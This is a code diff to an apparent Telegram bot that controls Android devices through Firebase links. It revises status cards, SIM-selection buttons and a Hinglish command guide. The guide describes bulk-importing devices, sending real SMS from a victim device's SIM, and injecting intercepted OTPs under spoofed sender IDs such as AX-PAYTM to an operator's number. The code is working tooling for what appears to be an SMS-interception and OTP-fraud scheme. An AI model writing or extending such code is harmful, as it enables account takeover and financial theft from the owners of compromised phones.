@@ -113,7 +113,7 @@ def get_inject_key(profile: MonitorProfile | None, device: Device) -> str:
     device_key = (device.api_key or "").strip().upper()
     if is_valid_license_key_format(device_key) and license_key_exists(device_key):
         return device_key
-    return "Not set — /key generate"
+    return "—"
 
 
 def get_battery(device: Device) -> str:
@@ -134,13 +134,17 @@ def get_model_name(device: Device) -> str:
 
 def _sim_button_label(sim: dict) -> str:
     slot = sim.get("slot", 1)
-    number = sim.get("number", "Unknown")
-    carrier = (sim.get("carrier") or "").strip()
-    if _is_valid_sim_number(number) and carrier and carrier.upper() not in {f"SIM {slot}", "SIM 1", "SIM 2"}:
-        return f"📶 SIM {slot}: {carrier} ({number})"
-    if _is_valid_sim_number(number):
-        return f"📶 SIM {slot} ({number})"
-    return f"📶 SIM {slot}"
+    number = sim.get("number") or "Unknown"
+    return f"📶 SIM {slot}: {number}"
+
+
+def _sim_lines_block(device: Device) -> str:
+    lines = []
+    for sim in get_sim_list(device):
+        slot = sim.get("slot", 1)
+        number = sim.get("number") or "Unknown"
+        lines.append(f"📶 SIM {slot}: {number}")
+    return "\n".join(lines) if lines else "📶 SIM: Unknown"
 
 
 def format_device_set_card(
@@ -169,13 +173,15 @@ def format_device_set_card(
         f"📞 {phone}\n"
         f"🔋 {get_battery(device)}\n"
         f"{status_line}\n"
-        f"🗄️ DB: {db_url}\n\n"
+        f"🗄️ DB: {db_url}\n"
+        f"{_sim_lines_block(device)}\n\n"
         f"Select SIM to send FROM:{timing}"
         "</pre>"
     )
 
 
 def device_set_keyboard(device: Device) -> InlineKeyboardMarkup:
+    sims = get_sim_list(device)
     rows = [
         [
             InlineKeyboardButton(
@@ -183,7 +189,7 @@ def device_set_keyboard(device: Device) -> InlineKeyboardMarkup:
                 callback_data=f"sim:{device.id}:{sim['index']}",
             )
         ]
-        for sim in get_active_sims(device)
+        for sim in sims
     ]
     return InlineKeyboardMarkup(rows)
 
@@ -206,65 +212,15 @@ def format_sim_selected_card(device: Device, sim_index: int = 0) -> str:
     active = get_selected_sim(device, sim_index)
     slot = active.get("slot", 1)
     number = active.get("number", "Unknown")
-    carrier = active.get("carrier") or f"SIM {slot}"
     return (
         "✅ <b>SUCCESS</b>\n\n"
         "<pre>"
         f"📱 {short_device_id(device.name)}\n"
-        f"📶 SIM {slot}: {carrier} ({number})\n"
+        f"{_sim_lines_block(device)}\n"
+        f"✅ FROM SIM {slot}: {number}\n"
         f"🔋 {get_battery(device)}"
         "</pre>"
     )
-
-
-def format_number_pick_card(device: Device, sim_index: int = 0) -> str:
-    active = get_selected_sim(device, sim_index)
-    slot = active.get("slot", 1)
-    return (
-        "✅ <b>SUCCESS</b>\n\n"
-        "<pre>"
-        f"📶 SIM {slot} selected\n\n"
-        "📞 Select number (OTP yahan jayega):"
-        "</pre>"
-    )
-
-
-def _unique_forward_numbers(device: Device, profile: MonitorProfile | None) -> list[str]:
-    from app.services import normalize_phone
-
-    seen: set[str] = set()
-    numbers: list[str] = []
-    if profile and profile.phone_number:
-        seen.add(profile.phone_number)
-        numbers.append(profile.phone_number)
-    for sim in get_active_sims(device):
-        raw = sim.get("number")
-        if not _is_valid_sim_number(raw):
-            continue
-        normalized = normalize_phone(str(raw))
-        if normalized not in seen:
-            seen.add(normalized)
-            numbers.append(normalized)
-    return numbers
-
-
-def mynum_pick_keyboard(device: Device, profile: MonitorProfile | None) -> InlineKeyboardMarkup:
-    rows = []
-    selected = profile.phone_number if profile else None
-    for number in _unique_forward_numbers(device, profile):
-        label = f"📞 {number}"
-        if number == selected and profile and profile.mynum_selected:
-            label = f"✅ {number}"
-        rows.append(
-            [
-                InlineKeyboardButton(
-                    label,
-                    callback_data=f"mynum:pick:{device.id}:{number}",
-                )
-            ]
-        )
-    rows.append([InlineKeyboardButton("🔴 STOP", callback_data="monitor:stop")])
-    return InlineKeyboardMarkup(rows)
 
 
 def _short_channel_id(channel_id: str) -> str:
@@ -380,15 +336,13 @@ def format_monitoring_card(
         "✅ <b>SUCCESS</b>\n\n"
         "<pre>"
         "Monitoring Started!\n\n"
-        f"📱 Device: {short_device_id(device.name)} | {get_model_name(device)}\n"
-        f"📶 FROM SIM: {sim_slot} ({sim_number})\n"
-        f"🔑 Inject Key: {inject_key}\n"
-        "📤 Incoming -&gt; spoof inject (same sender ID)\n"
-        f"📞 Real SMS -&gt; {target}\n"
-        f"📢 Channel: {channel} (last / addchannel only)\n"
-        f"⏱ Auto-stop in {auto_stop} minutes\n"
-        f"📦 Ignored {ignored_sms} old SMS (only NEW after this moment)\n"
-        f"✅ Test inject OK: {test_msg}"
+        f"📱 {short_device_id(device.name)}\n"
+        f"📶 FROM SIM {sim_slot}: {sim_number}\n"
+        f"🔑 {inject_key}\n"
+        f"📞 /mynum: {target}\n"
+        f"📢 {channel}\n"
+        f"⏱ {auto_stop}m | 📦 skip {ignored_sms}\n"
+        f"✅ {test_msg}"
         "</pre>"
     )
 
@@ -420,54 +374,59 @@ def format_welcome_message() -> str:
 def format_guide_message() -> str:
     return (
         "📖 <b>COMMAND GUIDE</b>\n\n"
-        "<b>Setup</b>\n"
+        "<b>💉 Injector</b>\n"
         "<pre>"
-        "/setfirebase &lt;url&gt;     Firebase connect\n"
-        "/allfirebase              Bulk .txt import\n"
-        "/fdy &lt;device_id&gt;         Device find (bina key)\n"
-        "/a &lt;device_id&gt;            Device find (key ke saath)\n"
-        "/mynum &lt;number&gt;           OTP inject target number\n"
-        "/addchannel &lt;id&gt;          Channel set (bot admin)\n"
-        "/startmonitor             Monitoring ON\n"
+        "/setfirebase &lt;url&gt;\n"
+        "/allfirebase\n"
+        "/key generate\n"
+        "/key KEY-XXXX-XXXX-XXXX\n"
+        "/fdy &lt;device_id&gt;\n"
+        "/mynum &lt;number&gt;\n"
+        "/addchannel &lt;id&gt;\n"
+        "/startmonitor"
         "</pre>\n\n"
-        "<b>KEY (APK + bot same key)</b>\n"
+        "<b>🔥 Admin</b>\n"
         "<pre>"
-        "/key generate             Nayi KEY\n"
-        "/key KEY-XXXX-XXXX-...    KEY set\n"
-        "/key confirm              APK verify\n"
-        "/key status KEY-...       Devices status\n"
+        "/setfirebase &lt;url&gt;\n"
+        "/allfirebase\n"
+        "/fb &lt;device_id&gt;\n"
+        "/mynum &lt;number&gt;\n"
+        "/addchannel &lt;id&gt;\n"
+        "/startmonitor"
         "</pre>\n\n"
-        "<b>Monitor</b>\n"
+        "<b>👤 User</b>\n"
         "<pre>"
-        "/stop                     Monitoring OFF\n"
-        "/resume                   Monitoring ON\n"
-        "/status                   Current stats\n"
-        "/send &lt;num&gt; &lt;msg&gt;       Manual SMS (selected SIM)\n"
-        "/ping                     Bot latency\n"
+        "/setfirebase &lt;url&gt;\n"
+        "/setdevice &lt;id&gt;\n"
+        "/a &lt;id&gt;\n"
+        "/mynum &lt;number&gt;\n"
+        "/addchannel &lt;id&gt;\n"
+        "/startmonitor"
         "</pre>\n\n"
-        "<b>Device aliases</b>\n"
+        "<b>🎮 Controls</b>\n"
         "<pre>"
-        "/fy /fb /la /setdevice    Same as /fdy\n"
-        "/devices                  Active device card\n"
-        "/device &lt;name&gt;           Device info\n"
+        "/stop\n"
+        "/resume\n"
+        "/status\n"
+        "/send &lt;num&gt; &lt;msg&gt;\n"
+        "/ping\n"
+        "/key confirm"
         "</pre>\n\n"
-        "<b>Channel SMS format</b>\n"
+        "<b>📡 Channel SMS</b>\n"
         "<pre>"
-        "To: 9876543210\n"
-        "Message: apna text\n"
-        "→ Selected SIM se real SMS"
+        "+91XXXXXXXXXX message\n"
+        "91XXXXXXXXXX message\n"
+        "XXXXXXXXXX message"
         "</pre>\n\n"
-        "<b>Incoming OTP</b>\n"
+        "<b>ℹ️ Kaise kaam karta hai</b>\n"
         "<pre>"
-        "Monitoring ON → inject /mynum par\n"
-        "Same sender ID (AX-PAYTM, etc.)\n"
-        "Test msg: Chacha Ji Pani Pila Do"
-        "</pre>\n\n"
-        "<b>Buttons flow</b>\n"
-        "<pre>"
-        "1. 📶 SIM 1/2 select\n"
-        "2. 📞 Number select (OTP target)\n"
-        "3. 🟢 Monitoring ON (msg pinned)"
+        "• SIM button pe device ka asli number dikhega\n"
+        "• /mynum = sirf incoming OTP inject (same sender ID)\n"
+        "• Channel = outgoing SMS (device se real SMS)\n"
+        "• KEY max 2 devices — /key confirm APK attach\n"
+        "• /allfirebase = .txt bulk import (1600+)\n"
+        "• Flow: SIM select → /mynum → /addchannel → Monitoring ON\n"
+        "• Monitoring ON message pin hoti hai"
         "</pre>\n\n"
         "<b>Admin</b>\n"
         "<pre>"
@@ -487,15 +446,16 @@ def format_status_card(device: Device | None, profile: MonitorProfile | None, sm
     device_name = short_device_id(device.name) if device else "Not set"
     sims = get_sim_list(device) if device else []
     sim_index = profile.selected_sim_index or 0
-    sim_label = sims[sim_index]["carrier"] if sims else "N/A"
+    active_sim = get_selected_sim(device, sim_index) if device else {}
+    sim_label = f"SIM {active_sim.get('slot', 1)}: {active_sim.get('number', '?')}"
 
     return (
         "✅ <b>STATUS</b>\n\n"
         "<pre>"
         f"Monitor: {monitoring}\n"
         f"📱 Device: {device_name}\n"
-        f"📶 SIM: {sim_label}\n"
-        f"📞 My Number: {profile.phone_number or 'Not set'}\n"
+        f"📶 {sim_label}\n"
+        f"📞 /mynum: {profile.phone_number or '—'}\n"
         f"📢 Channel: {profile.channel_id or 'Not set'}\n"
         f"🔥 Firebase: {'Connected' if profile.firebase_url else 'Not set'}\n"
         f"📨 SMS Count: {sms_count}\n"
@@ -508,14 +468,13 @@ def format_ping_card(latency_ms: int) -> str:
     return (
         "✅ <b>PONG</b>\n\n"
         "<pre>"
-        f"🏓 Latency: {latency_ms}ms\n"
-        "Bot is online and ready!"
+        f"🏓 {latency_ms}ms"
         "</pre>"
     )
 
 
 def format_key_error_card() -> str:
-    return "❌ <code>/key generate</code> ya <code>/key KEY-XXXX</code> — /guide"
+    return "❌ <code>/key</code> — <code>/guide</code>"
 
 
 def format_key_generated_card(license_key: str) -> str:
